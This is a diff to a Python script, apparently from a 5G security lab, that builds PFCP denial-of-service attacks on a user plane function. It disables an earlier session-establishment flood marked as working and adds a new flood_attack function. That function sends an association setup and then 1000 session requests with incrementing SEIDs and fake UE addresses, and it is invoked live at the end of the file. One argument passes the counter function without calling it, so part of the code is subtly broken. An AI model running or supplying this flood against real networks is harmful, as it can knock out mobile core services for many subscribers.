@@ -274,10 +274,16 @@ class PFCPDosAttack:
 # Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
 #                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
 
+# #works
+# pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+# pfcp_dos_obj.set_verbose(True)
+# pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1000, num_threads=10)
 
-pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-pfcp_dos_obj.set_verbose(True)
-pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1000, num_threads=10)
+
+
+
+
+
 
 
 # TODO: Utiliser le bon plan d'adresse
@@ -294,3 +300,31 @@ pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1000, num_threads=10)
 #                 seid=self.new_seid(), 
 #                 ue_addr=self.new_ue_addr(),
 #                 teid=self.new_teid()))
+
+
+
+monseidbidon = 0x1
+
+def increment_monseid():
+    global monseidbidon
+    monseidbidon += 1
+    if monseidbidon > 0xFFFFFFFFFFFFFFFF:
+        monseidbidon = 1
+    return monseidbidon
+
+ue_base_addr_bidon = "1.1.1.1"
+
+def increment_base_addr_bidon():
+    global ue_base_addr_bidon
+    ue_base_addr_bidon = ipaddress.IPv4Address(ue_base_addr_bidon) + 1
+    return str(ue_base_addr_bidon)
+
+def flood_attack(evil_addr, upf_addr, src_port, dest_port, count, ue_base_addr="1.1.1.1"):
+    pfcp_obj = Ez_PFCP(evil_addr, upf_addr, src_port, dest_port)
+    pfcp_obj.Send_PFCP_association_setup_req()
+    for i in range(count):
+        pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid, ue_addr=increment_base_addr_bidon())
+        
+
+
+flood_attack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 1000)
